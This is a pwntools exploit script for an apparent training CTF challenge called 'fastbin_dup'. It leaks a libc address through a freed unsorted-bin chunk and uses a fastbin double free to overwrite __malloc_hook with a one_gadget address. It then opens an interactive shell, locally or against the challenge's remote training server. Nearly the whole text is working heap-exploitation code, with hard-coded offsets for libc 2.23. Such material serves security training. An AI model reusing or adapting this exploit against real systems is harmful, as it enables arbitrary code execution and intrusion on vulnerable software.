from pwn import *

CHALL_PATH = "./fastbin_dup_patched"
CHALL = ELF(CHALL_PATH)
LIBC_PATH = "./downloads/libc-2.23.so"
LIBC = ELF(LIBC_PATH)
COMMANDS = """
c
"""


def alloc(c, size):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode())
    line = c.recvline()
    index = line.split(b"index ")[1].split(b"!\n")[0]
    return index

def write(c, index, data):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode())
    c.recvuntil(b"Content: ")
    c.send(data)

def read(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode())
    line = c.recvline()
    return line

def free(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode())



if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    #input("wait")
elif args.REM:
    c = remote("fastbin-dup.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

# Leak the main arena address
alloc(c, 0x100) # Index 0 (deterministic, we already know the index)
alloc(c, 0x30) # Index 1
free(c, 0)
leak = read(c, 0)[:6]
leak = u64(leak.ljust(8, b"\x00"))
LIBC.address = leak - 0x3c4b78
print("LIBC leak: ", hex(LIBC.address))

alloc(c, 0x60) # Index 2
alloc(c, 0x60) # Index 3

free(c, 2)
free(c, 3)
free(c, 2)

# We do not need the heap address, we have the main arena
#heap_leak = read(c, 0) # Index 2
#print(f"Heap leak: {heap_leak}")

alloc(c, 0x60) # Index 4
write(c, 4, p64(LIBC.address + 0x3c4aed)) # hook

alloc(c, 0x60) # Index 5
alloc(c, 0x60) # Index 6

alloc(c, 0x60) # Index 7
write(c, 7, b"A"*19 + p64(LIBC.address + 0xf1247)) # use third one_gadget

# Then allocate just any chunk (size 20 for example)

c.interactive()